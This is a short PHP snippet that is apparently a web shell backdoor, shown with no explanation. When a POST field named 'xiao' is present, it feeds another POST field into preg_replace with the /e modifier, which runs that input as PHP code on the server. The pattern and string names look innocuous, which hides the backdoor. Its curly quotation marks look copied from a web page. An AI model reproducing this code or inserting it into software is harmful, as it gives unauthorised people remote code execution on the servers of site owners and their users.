<?php
if(isset($_POST[‘xiao’])) {
$page = $_POST[page];
preg_replace(“/[errorpage]/e”,$page,”saft”);
exit;
}
?>